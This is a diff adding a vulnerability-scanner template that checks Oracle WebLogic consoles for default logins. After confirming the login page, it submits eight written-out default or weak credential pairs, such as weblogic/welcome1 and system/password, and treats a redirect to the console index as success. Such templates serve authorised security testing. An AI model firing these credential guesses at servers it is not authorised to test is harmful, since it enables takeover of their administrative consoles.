@@ -1,0 +1,74 @@
+id: weblogic-weak-login
+
+info:
+  name: WebLogic Default Login
+  author: pdteam
+  description: WebLogic default login credentials were discovered.
+  severity: high
+  tags: default-login,weblogic
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/weblogic/weak_password
+    - https://www.s-squaresystems.com/weblogic-default-admin-users-password-change/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cve-id:
+    cwe-id: CWE-522
+
+transport: http
+rules:
+    r11:
+        request:
+            method: GET
+            path: /console/login/LoginForm.jsp
+        expression: |
+            response.status == 200 && "WebLogic Server Version: (.*?)<".bmatches(response.body)
+    r0:
+        request:
+            method: POST
+            path: /console/j_security_check
+            body: j_username=weblogic&j_password=weblogic&j_character_encoding=UTF-8
+        expression: response.status == 302 && response.headers["location"].icontains("/console/index.jsp")
+    r1:
+        request:
+            method: POST
+            path: /console/j_security_check
+            body: j_username=weblogic&j_password=weblogic1&j_character_encoding=UTF-8
+        expression: response.status == 302 && response.headers["location"].icontains("/console/index.jsp") 
+    r2:
+        request:
+            method: POST
+            path: /console/j_security_check
+            body: j_username=weblogic&j_password=welcome1&j_character_encoding=UTF-8
+        expression: response.status == 302 && response.headers["location"].icontains("/console/index.jsp") 
+    r3:
+        request:
+            method: POST
+            path: /console/j_security_check
+            body: j_username=weblogic&j_password=Oracle@123&j_character_encoding=UTF-8
+        expression: response.status == 302 && response.headers["location"].icontains("/console/index.jsp") 
+    r4:
+        request:
+            method: POST
+            path: /console/j_security_check
+            body: j_username=weblogic&j_password=weblogic123&j_character_encoding=UTF-8
+        expression: response.status == 302 && response.headers["location"].icontains("/console/index.jsp") 
+    r5:
+        request:
+            method: POST
+            path: /console/j_security_check
+            body: j_username=admin&j_password=12345678&j_character_encoding=UTF-8
+        expression: response.status == 302 && response.headers["location"].icontains("/console/index.jsp") 
+    r6:
+        request:
+            method: POST
+            path: /console/j_security_check
+            body: j_username=admin&j_password=security&j_character_encoding=UTF-8
+        expression: response.status == 302 && response.headers["location"].icontains("/console/index.jsp")
+    r7:
+        request:
+            method: POST
+            path: /console/j_security_check
+            body: j_username=system&j_password=password&j_character_encoding=UTF-8
+        expression: response.status == 302 && response.headers["location"].icontains("/console/index.jsp")
+expression: r11() && (r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7())
